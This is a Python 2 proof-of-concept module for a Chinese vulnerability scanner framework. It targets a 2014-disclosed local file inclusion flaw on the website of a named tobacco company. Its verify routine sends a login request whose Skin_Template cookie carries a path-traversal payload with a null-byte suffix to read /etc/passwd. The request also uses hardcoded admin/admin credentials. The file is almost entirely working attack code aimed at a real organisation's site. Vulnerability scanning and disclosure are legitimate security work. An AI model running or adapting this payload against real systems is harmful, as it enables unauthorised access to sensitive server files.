# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Hongta_0000' # 平台漏洞编号
    name = '红塔烟草集团站点文件包含' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2014-09-28'  # 漏洞公布时间
    desc = '''
        红塔烟草集团站点文件包含漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=72320' #
    cnvd_id = 'Uknown' # cnvd漏洞编号
    cve_id = 'Uknown'  # cve编号
    product = '应用名称'  # 漏洞组件名称
    product_version = 'Uknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'b1a4b956-c42a-4bef-8ea5-0fcdaa7a6cdb' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/login1.php?Cmd=login'
            headers = {
                'Cookie':'PHPSESSID=35ei3hl72fn67i9mer4oc31ui2;LoginDomain=hongta.com;limit5=1;Skin_Template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg'
            }
            data = '''domaim=hongta.com&Lang=gb&skin=ht&name=admin&passwd=admin&code=6156&authnum=NjE2NQ%3D%3D&imageField.x=25&imageField.y=18'''
            response = requests.post(vul_url,headers=headers,data=data)
            if response.status_code ==200 and 'localhost' in response.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
